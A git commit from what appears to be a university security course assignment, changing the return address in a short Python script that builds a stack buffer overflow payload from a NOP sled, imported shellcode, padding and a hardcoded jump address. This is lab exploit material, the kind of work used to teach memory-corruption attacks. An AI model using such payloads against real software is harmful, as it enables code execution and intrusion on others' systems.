31a904912fa9cf5e2a89ebc8c6af8b517c674752
Hiro Christoph <hirochri@umich.edu>
2017-03-29 12:40:06 -0400

    Fixed typo even though it worked beforehand

--- project4/sol6.py
+++ project4/sol6.py
@@ -3,7 +3,7 @@
 from struct import pack
 from shellcode import shellcode
 
-jump_addr = pack("<I", 0xbffef87d)
+jump_addr = pack("<I", 0xbffef89d)
 
 #shellcode = "f"*53
 print "\x90"*971 + shellcode + "D"*12 + jump_addr
